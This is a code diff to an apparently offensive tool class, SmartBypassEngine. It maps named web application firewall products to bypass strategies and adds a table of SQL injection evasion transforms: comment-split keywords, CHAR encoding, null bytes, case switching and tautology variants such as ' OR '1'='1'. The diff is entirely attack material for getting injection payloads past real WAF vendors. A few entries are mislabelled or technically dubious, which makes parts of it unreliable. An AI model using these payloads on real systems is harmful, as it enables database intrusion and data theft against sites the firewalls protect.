@@ -247,23 +247,96 @@ class SmartBypassEngine:
             BypassStrategy.HEADER_MANIPULATION,
             BypassStrategy.ENCODING_TRICK,
             BypassStrategy.CASE_NORMALIZATION,
+            BypassStrategy.PATH_VARIATION,
         ],
         "Akamai": [
             BypassStrategy.PATH_VARIATION,
             BypassStrategy.PARAMETER_TAMPERING,
+            BypassStrategy.ENCODING_TRICK,
         ],
         "AWS WAF": [
             BypassStrategy.AUTH_INJECTION,
             BypassStrategy.HEADER_MANIPULATION,
+            BypassStrategy.PATH_VARIATION,
         ],
         "ModSecurity": [
             BypassStrategy.ENCODING_TRICK,
             BypassStrategy.PATH_VARIATION,
+            BypassStrategy.CASE_NORMALIZATION,
         ],
         "Generic WAF": [
             BypassStrategy.PATH_VARIATION,
             BypassStrategy.CASE_NORMALIZATION,
             BypassStrategy.ENCODING_TRICK,
+        ],
+        "F5 BIG-IP": [
+            BypassStrategy.HEADER_MANIPULATION,
+            BypassStrategy.PATH_VARIATION,
+            BypassStrategy.TIMING_ATTACK,
+        ],
+        "FortiWeb": [
+            BypassStrategy.ENCODING_TRICK,
+            BypassStrategy.PARAMETER_TAMPERING,
+            BypassStrategy.CASE_NORMALIZATION,
+        ],
+        "Imperva": [
+            BypassStrategy.HEADER_MANIPULATION,
+            BypassStrategy.PATH_VARIATION,
+            BypassStrategy.AUTH_INJECTION,
+        ],
+        "Sucuri": [
+            BypassStrategy.PATH_VARIATION,
+            BypassStrategy.ENCODING_TRICK,
+            BypassStrategy.HEADER_MANIPULATION,
+        ],
+        "Wordfence": [
+            BypassStrategy.PARAMETER_TAMPERING,
+            BypassStrategy.ENCODING_TRICK,
+        ],
+    }
+
+    SQLI_BYPASS_TECHNIQUES = {
+        'space2comment': [
+            ('UNION', 'UN/**/ION'),
+            ('SELECT', 'SEL/**/ECT'),
+            ('FROM', 'FR/**/OM'),
+            ('WHERE', 'WH/**/ERE'),
+            ("' OR '1'='1'", "'/**/OR/**/'1'='1"),
+        ],
+        'charencode': [
+            ('a', 'CHR(97)'),
+            ('SELECT', 'CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)'),
+            ('UNION', 'CHAR(85)+CHAR(78)+CHAR(73)+CHAR(79)+CHAR(78)'),
+        ],
+        'between': [
+            ('1=1', '1 BETWEEN 0 AND 1'),
+            ("' OR '1'='1'", "' OR '1' BETWEEN 'a' AND 'b'"),
+            ('> 0', 'BETWEEN 0 AND 999999'),
+        ],
+        'nullbyte': [
+            ('UNION', 'UNION%00'),
+            ('SELECT', 'SELECT%00'),
+            ('admin', 'admin%00'),
+        ],
+        'case_switch': [
+            ('union', 'uNiOn'),
+            ('select', 'SeLeCt'),
+            ('union', 'UNion'),
+        ],
+        'dblquotes': [
+            ("'1'", "''1''"),
+            ("' OR '1", "'' OR ''1"),
+        ],
+        'backslash': [
+            ("'", "\\'"),
+            (" UNION ", "\\\\ UNION\\\\"),
+        ],
+        'base64': [
+            ('SELECT', 'CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)'),
+        ],
+        'commentsplit': [
+            ('UNION SELECT', 'UNION/*comment*/SELECT'),
+            ('admin--', 'admin/**/--'),
         ],
     }
 
